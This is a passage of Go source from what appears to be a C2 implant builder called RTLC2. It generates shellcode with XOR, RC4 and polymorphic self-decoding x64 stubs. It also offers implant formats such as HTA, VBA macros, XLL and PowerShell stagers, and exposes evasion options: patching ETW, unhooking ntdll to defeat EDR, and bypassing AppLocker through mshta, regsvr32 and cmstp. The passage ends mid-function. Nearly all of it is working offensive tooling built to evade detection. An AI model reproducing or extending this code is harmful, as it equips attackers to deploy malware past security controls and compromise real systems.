	log.Infof("Shellcode generated: %s (%d bytes, format: %s, encoding: %s, SHA256: %s)",
		outputFilename, len(formattedData), req.ShellcodeFormat, encodingUsed, hashStr)

	jsonResponse(w, map[string]interface{}{
		"filename":           outputFilename,
		"data":               encoded,
		"size":               len(formattedData),
		"raw_size":           len(rawData),
		"hash":               hashStr,
		"format":             req.ShellcodeFormat,
		"encoding":           encodingUsed,
		"content_type":       contentType,
		"encryption_key":     cryptoKey,
	})
}

// extractTextSection attempts to extract the .text section from a compiled
// binary using objcopy. Returns nil if extraction fails or is not applicable.
func extractTextSection(binaryPath, buildDir, arch string) []byte {
	// Determine the right objcopy binary for cross-compilation
	objcopy := "objcopy"
	switch arch {
	case "x64":
		// Try cross-compiler objcopy first
		if _, err := exec.LookPath("x86_64-w64-mingw32-objcopy"); err == nil {
			objcopy = "x86_64-w64-mingw32-objcopy"
		}
	case "x86":
		if _, err := exec.LookPath("i686-w64-mingw32-objcopy"); err == nil {
			objcopy = "i686-w64-mingw32-objcopy"
		}
	case "arm64":
		if _, err := exec.LookPath("aarch64-linux-gnu-objcopy"); err == nil {
			objcopy = "aarch64-linux-gnu-objcopy"
		}
	}

	textOut := binaryPath + ".text"
	cmd := exec.Command(objcopy, "-O", "binary", "-j", ".text", binaryPath, textOut)
	if err := cmd.Run(); err != nil {
		log.Debugf("objcopy .text extraction failed (non-fatal): %v", err)
		return nil
	}

	data, err := os.ReadFile(textOut)
	if err != nil {
		return nil
	}

	// Clean up the temporary file
	os.Remove(textOut)

	if len(data) == 0 {
		return nil
	}

	log.Infof("Extracted .text section: %d bytes", len(data))
	return data
}

// ---------------------------------------------------------------------------
// Shellcode encoding: encoder dispatcher and implementations
// ---------------------------------------------------------------------------

// encodeShellcode applies an encoding layer to raw shellcode. The encoded
// output includes a self-decoding stub prepended so it is directly executable.
// Supported methods: "xor", "rc4", "sgn", "none".
func encodeShellcode(data []byte, method string) ([]byte, error) {
	switch method {
	case "none", "":
		return data, nil
	case "xor":
		return encodeXOR(data)
	case "rc4":
		return encodeRC4(data)
	case "sgn":
		return encodeSGN(data)
	default:
		return data, nil
	}
}

// encodeXOR applies XOR encoding with a 16-byte random key and prepends a
// position-independent x64 decoder stub. The output layout is:
//
//	[decoder_stub][key_16_bytes][xor_encoded_data]
//
// The stub decodes in-place and then falls through to execute the decoded
// shellcode.
func encodeXOR(data []byte) ([]byte, error) {
	// Generate 16-byte random XOR key
	key := make([]byte, 16)
	if _, err := rand.Read(key); err != nil {
		return nil, fmt.Errorf("failed to generate XOR key: %w", err)
	}

	// XOR-encode the payload
	encoded := make([]byte, len(data))
	for i, b := range data {
		encoded[i] = b ^ key[i%16]
	}

	// Build position-independent x64 decoder stub.
	// The stub uses RIP-relative addressing to locate the key and data
	// that immediately follow it, decodes in-place, then jumps to the
	// decoded shellcode.
	//
	// Layout after assembly:
	//   call $+5                    ; push RIP onto stack
	//   pop rsi                     ; RSI = address of "pop rsi" instruction
	//   ; RSI now points to the "pop rsi" instruction; we adjust to key/data
	//   lea rsi, [rsi + stub_len-5] ; RSI -> start of key (stub_len is total stub size)
	//   lea rdi, [rsi + 16]         ; RDI -> start of encoded data
	//   mov ecx, <data_len>         ; loop counter
	//   xor edx, edx               ; index = 0
	// decode_loop:
	//   mov al, [rsi + rdx]        ; load key byte (we AND rdx with 0xF below)
	//   ... but for simplicity, we compute rdx % 16 via AND
	//
	// Actual encoded stub bytes (x64):
	stub := []byte{
		// call $+5 (E8 00 00 00 00)
		0xE8, 0x00, 0x00, 0x00, 0x00,
		// pop rsi (5E) -- RSI = addr of this instruction
		0x5E,
		// lea rsi, [rsi + OFFSET_TO_KEY] -- will be patched
		// Using: 48 8D 76 XX where XX = offset from pop_rsi to key
		0x48, 0x8D, 0x76, 0x00, // [8] = offset, patched below
		// lea rdi, [rsi + 16] -- RDI points to encoded data (key is 16 bytes)
		0x48, 0x8D, 0x7E, 0x10,
		// mov ecx, IMM32 -- data length
		0xB9, 0x00, 0x00, 0x00, 0x00, // [14..17] = data length LE
		// xor edx, edx
		0x31, 0xD2,
		// decode_loop: (offset 20)
		// push rdx
		0x52,
		// and edx, 0x0F -- rdx % 16
		0x83, 0xE2, 0x0F,
		// mov al, [rsi + rdx]
		0x8A, 0x04, 0x16,
		// pop rdx -- restore original index
		0x5A,
		// xor [rdi], al
		0x30, 0x07,
		// inc rdi
		0x48, 0xFF, 0xC7,
		// inc edx
		0xFF, 0xC2,
		// dec ecx
		0xFF, 0xC9,
		// jnz decode_loop (offset 20) -- relative jump back
		0x75, 0x00, // [37] = relative offset, patched below
		// After loop: jump to decoded data (lea rdi was already at data start,
		// but rdi has advanced past it. Instead, jump to rsi+16.)
		// lea rax, [rsi + 16]
		0x48, 0x8D, 0x46, 0x10,
		// jmp rax
		0xFF, 0xE0,
	}

	stubLen := len(stub)

	// Patch offset from pop_rsi to key: key is at stub[stubLen], pop_rsi is at stub[5]
	// The lea rsi,[rsi+XX] at offset 6 uses the offset from RSI (which points at offset 5)
	// So offset = stubLen - 5
	stub[9] = byte(stubLen - 5)

	// Patch data length (little-endian uint32 at offset 14)
	binary.LittleEndian.PutUint32(stub[14:18], uint32(len(data)))

	// Patch jnz relative offset: from instruction after jnz (offset 38) back to decode_loop (offset 20)
	// jnz is at offset 36, 2 bytes (opcode + rel8), so next instruction is at 38
	// relative offset = 20 - 38 = -18 = 0xEE
	jnzOffset := 20 - (36 + 2)
	stub[37] = byte(jnzOffset)

	// Assemble: stub + key + encoded_data
	result := make([]byte, 0, stubLen+16+len(encoded))
	result = append(result, stub...)
	result = append(result, key...)
	result = append(result, encoded...)

	return result, nil
}

// rc4Crypt performs RC4 encryption/decryption (symmetric). It implements the
// full KSA + PRGA in Go.
func rc4Crypt(key, data []byte) []byte {
	// Key-Scheduling Algorithm (KSA)
	var s [256]byte
	for i := 0; i < 256; i++ {
		s[i] = byte(i)
	}
	j := 0
	for i := 0; i < 256; i++ {
		j = (j + int(s[i]) + int(key[i%len(key)])) % 256
		s[i], s[j] = s[j], s[i]
	}

	// Pseudo-Random Generation Algorithm (PRGA)
	out := make([]byte, len(data))
	i, j := 0, 0
	for k := 0; k < len(data); k++ {
		i = (i + 1) % 256
		j = (j + int(s[i])) % 256
		s[i], s[j] = s[j], s[i]
		out[k] = data[k] ^ s[(int(s[i])+int(s[j]))%256]
	}
	return out
}

// encodeRC4 applies RC4 encoding with a 16-byte random key and prepends a
// minimal x64 RC4 decoder stub. Layout: [stub][key_16][rc4_encrypted_data]
func encodeRC4(data []byte) ([]byte, error) {
	// Generate 16-byte RC4 key
	key := make([]byte, 16)
	if _, err := rand.Read(key); err != nil {
		return nil, fmt.Errorf("failed to generate RC4 key: %w", err)
	}

	// RC4 encrypt
	encrypted := rc4Crypt(key, data)

	// Build a compact x64 RC4 decoder stub. This is a position-independent
	// implementation that performs KSA + PRGA inline. The stub locates the
	// key and ciphertext via RIP-relative addressing, decrypts in-place,
	// then jumps to the decrypted shellcode.
	//
	// To keep complexity manageable, we use a "call/pop" trick for PIC,
	// then implement KSA (256 iterations) and PRGA (len iterations).
	// Register allocation:
	//   RSI = key pointer
	//   RDI = data pointer
	//   R8  = S-box (256 bytes on stack)
	//   ECX = counter / temp
	//   EDX = j index
	//
	// The stub is assembled as raw bytes.
	// Due to the complexity of an inline RC4 stub in raw bytes (~120 bytes),
	// we use a simpler approach: emit a minimal bootstrap that calls back
	// into a small embedded RC4 routine.

	// For the RC4 stub, we use a slightly larger but correct implementation.
	// Total stub size is calculated after construction.

	var stub []byte

	// --- Preamble: get RIP, locate key and data ---
	stub = append(stub,
		// sub rsp, 0x108 -- allocate 264 bytes for S-box (256) + alignment
		0x48, 0x81, 0xEC, 0x08, 0x01, 0x00, 0x00,
		// call $+5
		0xE8, 0x00, 0x00, 0x00, 0x00,
		// pop rbx -- RBX = address of this pop instruction
		0x5B,
	)
	preambleLen := len(stub) // 12

	// We will patch the key/data offsets relative to RBX (at offset 11, the pop rbx)
	// Key is at: stub_end (from start), so offset from RBX = stub_total - preambleLen + 1... complex.
	// Instead, let's build the full stub, then patch at the end.

	stub = append(stub,
		// lea rsi, [rbx + KEY_OFFSET] -- patched later at fixup_key_off
		0x48, 0x8D, 0x73, 0x00, // [preambleLen+0..+3], byte [preambleLen+3] = offset
		// lea rdi, [rbx + DATA_OFFSET] -- patched later
		0x48, 0x8D, 0x7B, 0x00, // [preambleLen+4..+7], byte [preambleLen+7] = offset

		// --- KSA: initialize S-box ---
		// mov r8, rsp  -- R8 = S-box base
		0x49, 0x89, 0xE0,
		// xor ecx, ecx
		0x31, 0xC9,
		// ksa_init: mov [r8+rcx], cl
		0x41, 0x88, 0x0C, 0x08,
		// inc cl
		0xFE, 0xC1,
		// jnz ksa_init (-5)
		0x75, 0xFB,

		// --- KSA: permute ---
		// xor ecx, ecx  -- i = 0
		0x31, 0xC9,
		// xor edx, edx  -- j = 0
		0x31, 0xD2,
	)

	ksaLoopStart := len(stub)
	stub = append(stub,
		// movzx eax, byte [r8+rcx] -- S[i]
		0x41, 0x0F, 0xB6, 0x04, 0x08,
		// push rcx
		0x51,
		// and ecx, 0x0F -- i % 16 (key length)
		0x83, 0xE1, 0x0F,
		// movzx ebx, byte [rsi+rcx] -- key[i%16]
		// note: we clobbered rbx, but we already used it. save/restore.
		// Actually let's use r9 for the key byte to avoid clobbering rbx.
		// movzx r9d, byte [rsi+rcx]
		0x44, 0x0F, 0xB6, 0x0C, 0x0E,
		// pop rcx -- restore i
		0x59,
		// add edx, eax -- j += S[i]
		0x01, 0xC2,
		// add edx, r9d -- j += key[i%16]
		0x44, 0x01, 0xCA,
		// and edx, 0xFF -- j &= 0xFF
		0x81, 0xE2, 0xFF, 0x00, 0x00, 0x00,
		// Swap S[i] and S[j]:
		// movzx r9d, byte [r8+rdx] -- S[j]
		0x45, 0x0F, 0xB6, 0x0C, 0x10,
		// mov [r8+rdx], al -- S[j] = S[i]
		0x41, 0x88, 0x04, 0x10,
		// mov [r8+rcx], r9b -- S[i] = old S[j]
		0x45, 0x88, 0x0C, 0x08,
		// inc cl
		0xFE, 0xC1,
		// jnz ksa_permute (back to ksaLoopStart)
		0x75, 0x00, // patched below
	)
	// Patch KSA loop jump
	ksaJnzPos := len(stub) - 1
	stub[ksaJnzPos] = byte(ksaLoopStart - len(stub))

	// --- PRGA: decrypt data ---
	stub = append(stub,
		// xor ecx, ecx -- i = 0
		0x31, 0xC9,
		// xor edx, edx -- j = 0
		0x31, 0xD2,
		// mov r10d, IMM32 -- data length, patched below
		0x41, 0xBA, 0x00, 0x00, 0x00, 0x00,
	)
	dataLenPos := len(stub) - 4

	prgaLoopStart := len(stub)
	stub = append(stub,
		// test r10d, r10d
		0x45, 0x85, 0xD2,
		// jz done (patched below)
		0x74, 0x00, // patched below
	)
	prgaDoneJzPos := len(stub) - 1

	stub = append(stub,
		// inc cl -- i = (i+1) & 0xFF
		0xFE, 0xC1,
		// movzx eax, byte [r8+rcx] -- S[i]
		0x41, 0x0F, 0xB6, 0x04, 0x08,
		// add edx, eax -- j += S[i]
		0x01, 0xC2,
		// and edx, 0xFF
		0x81, 0xE2, 0xFF, 0x00, 0x00, 0x00,
		// movzx r9d, byte [r8+rdx] -- S[j]
		0x45, 0x0F, 0xB6, 0x0C, 0x10,
		// Swap S[i], S[j]
		// mov [r8+rdx], al
		0x41, 0x88, 0x04, 0x10,
		// mov [r8+rcx], r9b
		0x45, 0x88, 0x0C, 0x08,
		// add al, r9b -- S[i] + S[j]
		0x44, 0x00, 0xC8,
		// movzx eax, al -- zero-extend
		0x0F, 0xB6, 0xC0,
		// movzx eax, byte [r8+rax] -- S[(S[i]+S[j]) & 0xFF]
		0x41, 0x0F, 0xB6, 0x04, 0x00,
		// xor [rdi], al -- decrypt byte
		0x30, 0x07,
		// inc rdi
		0x48, 0xFF, 0xC7,
		// dec r10d
		0x41, 0xFF, 0xCA,
		// jmp prgaLoopStart
		0xEB, 0x00, // patched below
	)
	prgaJmpPos := len(stub) - 1
	stub[prgaJmpPos] = byte(prgaLoopStart - len(stub))

	// done:
	doneOffset := len(stub)
	stub[prgaDoneJzPos] = byte(doneOffset - (int(prgaDoneJzPos) + 1))

	stub = append(stub,
		// add rsp, 0x108 -- restore stack (deallocate S-box)
		0x48, 0x81, 0xC4, 0x08, 0x01, 0x00, 0x00,
		// Now jump to the decrypted data. We need to recalculate data pointer.
		// call $+5
		0xE8, 0x00, 0x00, 0x00, 0x00,
		// pop rax
		0x58,
		// lea rax, [rax + OFFSET_TO_DATA] -- patched
		0x48, 0x8D, 0x40, 0x00, // last byte patched
		// jmp rax
		0xFF, 0xE0,
	)

	stubLen := len(stub)

	// --- Patch offsets ---
	// RBX was set to address of pop rbx instruction at offset (preambleLen - 1) = 11
	// Key starts at stubLen, data starts at stubLen + 16
	// Offsets are relative to RBX (the pop rbx instruction at offset 11)
	keyOffFromRBX := stubLen - (preambleLen - 1)
	dataOffFromRBX := stubLen + 16 - (preambleLen - 1)

	// Check offsets fit in int8
	if keyOffFromRBX > 127 || dataOffFromRBX > 127 {
		return nil, fmt.Errorf("RC4 stub too large for int8 offsets (%d, %d)", keyOffFromRBX, dataOffFromRBX)
	}

	stub[preambleLen+3] = byte(keyOffFromRBX)
	stub[preambleLen+7] = byte(dataOffFromRBX)

	// Patch data length
	binary.LittleEndian.PutUint32(stub[dataLenPos:dataLenPos+4], uint32(len(data)))

	// Patch the final jump-to-data offset
	// The pop rax is at stubLen - 6, pointing to itself.
	// lea rax,[rax+XX] at stubLen-5, the offset = (stubLen + 16) - (stubLen - 4) = 20
	// Actually: pop rax gives address of pop rax instruction. Let's count:
	// call $+5 is at stubLen - 10 (5 bytes)
	// pop rax is at stubLen - 5
	// lea rax,[rax+XX] is at stubLen - 4 (4 bytes)
	// jmp rax is at stubLen - 2 (2 bytes) -- wait, let me recount.

	// The last section:
	//   add rsp, 0x108  : 7 bytes  (stubLen - 16)
	//   call $+5        : 5 bytes  (stubLen - 9)
	//   pop rax         : 1 byte   (stubLen - 4)
	//   lea rax,[rax+X] : 4 bytes  (stubLen - 3) -- but that's only if X is int8
	//   jmp rax         : 2 bytes  (stubLen - 0) -- no

	// Let me just recount from the end of the stub array.
	// jmp rax = FF E0 = last 2 bytes => at stubLen-2
	// lea rax,[rax+X] = 48 8D 40 XX = 4 bytes => at stubLen-6
	// pop rax = 58 = 1 byte => at stubLen-7
	// call $+5 = E8 00 00 00 00 = 5 bytes => at stubLen-12
	// add rsp, 0x108 = 7 bytes => at stubLen-19

	// pop rax gives address of itself = stubLen - 7 (in the assembled output)
	// We want to jump to stubLen + 16 (start of data after key)
	// Offset from pop rax location: (stubLen + 16) - (stubLen - 7) = 23
	// But the lea uses [rax + X], so X = 23
	// The lea offset byte is at stubLen - 3
	stub[stubLen-3] = byte((stubLen + 16) - (stubLen - 7))

	// Assemble final output
	result := make([]byte, 0, stubLen+16+len(encrypted))
	result = append(result, stub...)
	result = append(result, key...)
	result = append(result, encrypted...)

	return result, nil
}

// encodeSGN applies a simplified Shikata Ga Nai (polymorphic) encoding.
// It uses XOR encoding as the base but inserts random NOP-equivalent
// instructions between stub bytes to change the signature on each generation.
func encodeSGN(data []byte) ([]byte, error) {
	// Generate 16-byte random XOR key
	key := make([]byte, 16)
	if _, err := rand.Read(key); err != nil {
		return nil, fmt.Errorf("failed to generate SGN key: %w", err)
	}

	// XOR-encode the payload (same as encodeXOR)
	encoded := make([]byte, len(data))
	for i, b := range data {
		encoded[i] = b ^ key[i%16]
	}

	// NOP-equivalent instruction sequences for x64
	nopEquivalents := [][]byte{
		{0x90},                   // nop
		{0x48, 0x87, 0xC0},       // xchg rax, rax
		{0x48, 0x8D, 0x00},       // lea rax, [rax]
		{0x48, 0x89, 0xC0},       // mov rax, rax
		{0x66, 0x90},             // 66 nop (2-byte nop)
		{0x0F, 0x1F, 0x00},       // nop dword [rax] (3-byte nop)
		{0x48, 0x8D, 0x09},       // lea rcx, [rcx]
		{0x48, 0x87, 0xC9},       // xchg rcx, rcx
	}

	// Seed the PRNG with crypto/rand for unpredictability
	seedBytes := make([]byte, 8)
	rand.Read(seedBytes)
	seed := int64(binary.LittleEndian.Uint64(seedBytes))
	rng := mrand.New(mrand.NewSource(seed))

	// Helper: insert 1-5 random NOP-equivalent instructions
	insertJunk := func() []byte {
		count := 1 + rng.Intn(5)
		var junk []byte
		for i := 0; i < count; i++ {
			nop := nopEquivalents[rng.Intn(len(nopEquivalents))]
			junk = append(junk, nop...)
		}
		return junk
	}

	// Build a polymorphic decoder stub. We construct it instruction by
	// instruction with junk insertions between logical operations.
	var stub []byte

	// call $+5 (get RIP)
	stub = append(stub, 0xE8, 0x00, 0x00, 0x00, 0x00)
	stub = append(stub, insertJunk()...)

	// pop rsi
	stub = append(stub, 0x5E)
	popRsiOffset := 5 // offset of pop rsi from start (after call)
	_ = popRsiOffset
	stub = append(stub, insertJunk()...)

	// We need to know where in the stub we are to calculate the offset to key.
	// Mark the position where we'll insert the lea rsi offset.
	leaRsiPos := len(stub)
	// lea rsi, [rsi + OFFSET] -- offset patched later
	stub = append(stub, 0x48, 0x8D, 0x76, 0x00)
	stub = append(stub, insertJunk()...)

	// lea rdi, [rsi + 16] -- RDI -> encoded data
	stub = append(stub, 0x48, 0x8D, 0x7E, 0x10)
	stub = append(stub, insertJunk()...)

	// mov ecx, IMM32 -- data length
	dataLenPos := len(stub) + 1
	stub = append(stub, 0xB9, 0x00, 0x00, 0x00, 0x00)
	stub = append(stub, insertJunk()...)

	// xor edx, edx
	stub = append(stub, 0x31, 0xD2)
	stub = append(stub, insertJunk()...)

	// decode_loop:
	decodeLoopOffset := len(stub)

	// push rdx
	stub = append(stub, 0x52)
	stub = append(stub, insertJunk()...)

	// and edx, 0x0F
	stub = append(stub, 0x83, 0xE2, 0x0F)
	stub = append(stub, insertJunk()...)

	// mov al, [rsi + rdx]
	stub = append(stub, 0x8A, 0x04, 0x16)
	stub = append(stub, insertJunk()...)

	// pop rdx
	stub = append(stub, 0x5A)
	stub = append(stub, insertJunk()...)

	// xor [rdi], al
	stub = append(stub, 0x30, 0x07)
	stub = append(stub, insertJunk()...)

	// inc rdi
	stub = append(stub, 0x48, 0xFF, 0xC7)
	stub = append(stub, insertJunk()...)

	// inc edx
	stub = append(stub, 0xFF, 0xC2)
	stub = append(stub, insertJunk()...)

	// dec ecx
	stub = append(stub, 0xFF, 0xC9)

	// jnz decode_loop
	jnzPos := len(stub)
	stub = append(stub, 0x0F, 0x85, 0x00, 0x00, 0x00, 0x00) // jnz rel32 for larger offsets
	stub = append(stub, insertJunk()...)

	// lea rax, [rsi + 16]
	stub = append(stub, 0x48, 0x8D, 0x46, 0x10)
	// jmp rax
	stub = append(stub, 0xFF, 0xE0)

	stubLen := len(stub)

	// Patch lea rsi offset: from pop_rsi to key (key is at stubLen)
	// pop rsi is at offset 5 in the stream, RSI = address of pop rsi
	// The lea rsi,[rsi+X] at leaRsiPos adds X to RSI.
	// We need RSI to point to key at stubLen.
	// So X = stubLen - 5 (distance from pop_rsi addr to key)
	leaOffset := stubLen - 5
	if leaOffset > 127 {
		// Need to use a 32-bit offset form instead. Replace the lea with
		// a 32-bit displacement version.
		// lea rsi, [rsi + imm32] = 48 8D B6 XX XX XX XX (7 bytes vs 4)
		// We need to expand the stub at leaRsiPos
		expansion := []byte{0x48, 0x8D, 0xB6, 0x00, 0x00, 0x00, 0x00}
		binary.LittleEndian.PutUint32(expansion[3:7], uint32(leaOffset+3)) // +3 because expansion is 3 bytes larger
		// Splice into stub
		newStub := make([]byte, 0, len(stub)+3)
		newStub = append(newStub, stub[:leaRsiPos]...)
		newStub = append(newStub, expansion...)
		newStub = append(newStub, stub[leaRsiPos+4:]...)
		stub = newStub
		stubLen = len(stub)

		// Recalculate positions that shifted by 3
		dataLenPos += 3
		decodeLoopOffset += 3
		jnzPos += 3

		// Re-patch lea offset with new stubLen
		leaOffsetNew := stubLen - 5
		binary.LittleEndian.PutUint32(stub[leaRsiPos+3:leaRsiPos+7], uint32(leaOffsetNew))
	} else {
		stub[leaRsiPos+3] = byte(leaOffset)
	}

	// Patch data length
	binary.LittleEndian.PutUint32(stub[dataLenPos:dataLenPos+4], uint32(len(data)))

	// Patch jnz: relative offset from after jnz instruction to decodeLoopOffset
	// jnz rel32 is 6 bytes, so next instruction is at jnzPos + 6
	jnzRel := int32(decodeLoopOffset - (jnzPos + 6))
	binary.LittleEndian.PutUint32(stub[jnzPos+2:jnzPos+6], uint32(jnzRel))

	// Assemble: stub + key + encoded_data
	result := make([]byte, 0, stubLen+16+len(encoded))
	result = append(result, stub...)
	result = append(result, key...)
	result = append(result, encoded...)

	return result, nil
}

// ---------------------------------------------------------------------------
// handlePayloadFormats returns all supported payload formats including
// shellcode output formats, encryption types, and OPSEC options.
// ---------------------------------------------------------------------------
func (h *HTTPAPIServer) handlePayloadFormats(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodGet {
		jsonError(w, "method not allowed", http.StatusMethodNotAllowed)
		return
	}

	formats := []map[string]interface{}{
		{"id": "exe", "name": "Executable (EXE)", "os": []string{"windows", "linux", "macos"}},
		{"id": "dll", "name": "Dynamic Library (DLL)", "os": []string{"windows"}},
		{"id": "shellcode", "name": "Raw Shellcode", "os": []string{"windows", "linux", "macos"}},
		{"id": "loader", "name": "Shellcode Loader (EXE)", "os": []string{"windows", "linux", "macos"}},
		{"id": "loader_dll", "name": "Shellcode Loader (DLL)", "os": []string{"windows"}},
		{"id": "powershell", "name": "PowerShell Stager", "os": []string{"windows"}},
		{"id": "hta", "name": "HTA Application", "os": []string{"windows"}},
		{"id": "macro", "name": "VBA Macro", "os": []string{"windows"}},
		{"id": "service_exe", "name": "Service Executable", "os": []string{"windows"}},
		{"id": "cpl", "name": "Control Panel Applet (CPL)", "os": []string{"windows"}},
		{"id": "xll", "name": "Excel Add-In (XLL)", "os": []string{"windows"}},
	}

	shellcodeFormats := []map[string]interface{}{
		{"id": "raw", "name": "Raw Binary", "extension": "bin", "content_type": "application/octet-stream"},
		{"id": "c_array", "name": "C Array", "extension": "h", "content_type": "text/plain"},
		{"id": "python", "name": "Python", "extension": "py", "content_type": "text/plain"},
		{"id": "csharp", "name": "C# Byte Array", "extension": "cs", "content_type": "text/plain"},
		{"id": "powershell", "name": "PowerShell Byte Array", "extension": "ps1", "content_type": "text/plain"},
		{"id": "nim", "name": "Nim Byte Array", "extension": "nim", "content_type": "text/plain"},
		{"id": "go", "name": "Go Byte Slice", "extension": "go", "content_type": "text/plain"},
		{"id": "rust", "name": "Rust Byte Array", "extension": "rs", "content_type": "text/plain"},
	}

	shellcodeEncodings := []map[string]interface{}{
		{"id": "none", "name": "None", "description": "No encoding applied"},
		{"id": "xor", "name": "XOR", "description": "XOR encoding with 16-byte key and position-independent decoder stub"},
		{"id": "rc4", "name": "RC4", "description": "RC4 stream cipher with 16-byte key and self-decoding stub"},
		{"id": "sgn", "name": "SGN (Polymorphic)", "description": "Shikata Ga Nai style polymorphic XOR encoding with NOP-equivalent insertions"},
	}

	encryptionTypes := []map[string]interface{}{
		{"id": "aes", "name": "AES-256-CBC", "key_size": 32, "description": "AES-256 encryption in CBC mode"},
		{"id": "xor", "name": "XOR", "key_size": 16, "description": "XOR encryption with 16-byte key"},
		{"id": "rc4", "name": "RC4", "key_size": 16, "description": "RC4 stream cipher with 16-byte key"},
	}

	architectures := []map[string]interface{}{
		{"id": "x64", "name": "x86-64", "os": []string{"windows", "linux", "macos"}},
		{"id": "x86", "name": "x86 (32-bit)", "os": []string{"windows", "linux"}},
		{"id": "arm64", "name": "ARM64 / AArch64", "os": []string{"linux", "macos"}},
	}

	opsecOptions := map[string]interface{}{
		"sleep_mask":        map[string]string{"type": "bool", "description": "Encrypt agent memory during sleep"},
		"stack_spoof":       map[string]string{"type": "bool", "description": "Spoof call stack frames"},
		"module_stomping":   map[string]string{"type": "bool", "description": "Stomp loaded module memory"},
		"syscall_method":    map[string]string{"type": "enum", "values": "none,direct,indirect", "description": "System call invocation method"},
		"etw_patch":         map[string]string{"type": "bool", "description": "Patch ETW to blind event tracing"},
		"unhook_ntdll":      map[string]string{"type": "bool", "description": "Unhook ntdll.dll to remove EDR hooks"},
		"thread_stack_spoof": map[string]string{"type": "bool", "description": "Spoof thread call stacks"},
		"heap_encryption":   map[string]string{"type": "bool", "description": "Encrypt heap allocations during sleep"},
	}

	jsonResponse(w, map[string]interface{}{
		"formats":             formats,
		"shellcode_formats":   shellcodeFormats,
		"shellcode_encodings": shellcodeEncodings,
		"encryption_types":    encryptionTypes,
		"architectures":       architectures,
		"opsec_options":       opsecOptions,
	})
}

// ---------------------------------------------------------------------------
// buildEnvVars constructs the environment variable list that the build scripts
// use to generate config.h.in preprocessor defines.
// ---------------------------------------------------------------------------
func buildEnvVars(enc EncryptionConfig, ev EvasionConfig, ops OpsecConfig) []string {
	vars := []string{
		// Encryption
		fmt.Sprintf("RTLC2_TRANSPORT_ENC=%s", enc.TransportType),
		fmt.Sprintf("RTLC2_PAYLOAD_ENC=%s", enc.PayloadType),
		fmt.Sprintf("RTLC2_ENC_KEY=%s", enc.Key),

		// OPSEC
		fmt.Sprintf("RTLC2_SLEEP_MASK=%s", boolToDefine(ops.SleepMask)),
		fmt.Sprintf("RTLC2_STACK_SPOOF=%s", boolToDefine(ops.StackSpoof)),
		fmt.Sprintf("RTLC2_MODULE_STOMPING=%s", boolToDefine(ops.ModuleStomping)),
		fmt.Sprintf("RTLC2_SYSCALL_METHOD=%s", ops.SyscallMethod),
		fmt.Sprintf("RTLC2_ETW_PATCH=%s", boolToDefine(ops.ETWPatch)),
		fmt.Sprintf("RTLC2_UNHOOK_NTDLL=%s", boolToDefine(ops.UnhookNtdll)),
		fmt.Sprintf("RTLC2_THREAD_STACK_SPOOF=%s", boolToDefine(ops.ThreadStackSpoof)),
		fmt.Sprintf("RTLC2_HEAP_ENCRYPTION=%s", boolToDefine(ops.HeapEncryption)),

		// Evasion: Execution
		fmt.Sprintf("RTLC2_EVASION_IN_MEMORY=%s", boolToDefine(ev.Execution.InMemory)),
		fmt.Sprintf("RTLC2_EVASION_NO_DISK=%s", boolToDefine(ev.Execution.NoDisk)),
		fmt.Sprintf("RTLC2_EVASION_STAGED_CHUNKS=%s", boolToDefine(ev.Execution.StagedChunks)),
		fmt.Sprintf("RTLC2_EVASION_DELAY_EXEC=%s", boolToDefine(ev.Execution.DelayExec)),
		fmt.Sprintf("RTLC2_EVASION_ENV_KEYING=%s", boolToDefine(ev.Execution.EnvKeying)),
		fmt.Sprintf("RTLC2_EVASION_TIME_STOMP=%s", boolToDefine(ev.Execution.TimeStomp)),
		fmt.Sprintf("RTLC2_EVASION_POLYMORPHIC=%s", boolToDefine(ev.Execution.Polymorphic)),
		fmt.Sprintf("RTLC2_EVASION_METAMORPHIC=%s", boolToDefine(ev.Execution.Metamorphic)),
		fmt.Sprintf("RTLC2_EVASION_JIT_COMPILE=%s", boolToDefine(ev.Execution.JITCompile)),
		fmt.Sprintf("RTLC2_EVASION_THREAD_POOL=%s", boolToDefine(ev.Execution.ThreadPool)),

		// Evasion: AppLocker
		fmt.Sprintf("RTLC2_EVASION_DLL_SIDELOAD=%s", boolToDefine(ev.AppLocker.DLLSideload)),
		fmt.Sprintf("RTLC2_EVASION_MSBUILD_EXEC=%s", boolToDefine(ev.AppLocker.MSBuildExec)),
		fmt.Sprintf("RTLC2_EVASION_INSTALLUTIL_EXEC=%s", boolToDefine(ev.AppLocker.InstallUtilExec)),
		fmt.Sprintf("RTLC2_EVASION_REGSVR_EXEC=%s", boolToDefine(ev.AppLocker.RegSvrExec)),
		fmt.Sprintf("RTLC2_EVASION_RUNDLL32_EXEC=%s", boolToDefine(ev.AppLocker.RunDLL32Exec)),
		fmt.Sprintf("RTLC2_EVASION_MSHTA=%s", boolToDefine(ev.AppLocker.MShta)),
		fmt.Sprintf("RTLC2_EVASION_CMSTP=%s", boolToDefine(ev.AppLocker.CMSTP)),
		fmt.Sprintf("RTLC2_EVASION_WHITELIST_BYPASS=%s", boolToDefine(ev.AppLocker.WhitelistBypass)),
		fmt.Sprintf("RTLC2_EVASION_TRUSTED_FOLDER=%s", boolToDefine(ev.AppLocker.TrustedFolder)),
		fmt.Sprintf("RTLC2_EVASION_ADS=%s", boolToDefine(ev.AppLocker.AlternateDataStr)),

		// Evasion: Trusted Path
		fmt.Sprintf("RTLC2_EVASION_SYSTEM_DIR=%s", boolToDefine(ev.TrustedPath.SystemDir)),
		fmt.Sprintf("RTLC2_EVASION_PROGRAM_FILES=%s", boolToDefine(ev.TrustedPath.ProgramFiles)),
		fmt.Sprintf("RTLC2_EVASION_WINDOWS_APPS=%s", boolToDefine(ev.TrustedPath.WindowsApps)),
		fmt.Sprintf("RTLC2_EVASION_TEMP_SIGNED=%s", boolToDefine(ev.TrustedPath.TempSigned)),
		fmt.Sprintf("RTLC2_EVASION_RECYCLE_BIN=%s", boolToDefine(ev.TrustedPath.RecycleBin)),
		fmt.Sprintf("RTLC2_EVASION_WINSXS=%s", boolToDefine(ev.TrustedPath.WinSxS)),
		fmt.Sprintf("RTLC2_EVASION_DRIVER_STORE=%s", boolToDefine(ev.TrustedPath.DriverStore)),
		fmt.Sprintf("RTLC2_EVASION_GAC=%s", boolToDefine(ev.TrustedPath.GlobalAssembly)),
		fmt.Sprintf("RTLC2_EVASION_COM_SURROGATE=%s", boolToDefine(ev.TrustedPath.COMSurrogate)),
		fmt.Sprintf("RTLC2_EVASION_PRINT_SPOOLER=%s", boolToDefine(ev.TrustedPath.PrintSpooler)),

		// Evasion: Memory Loaders
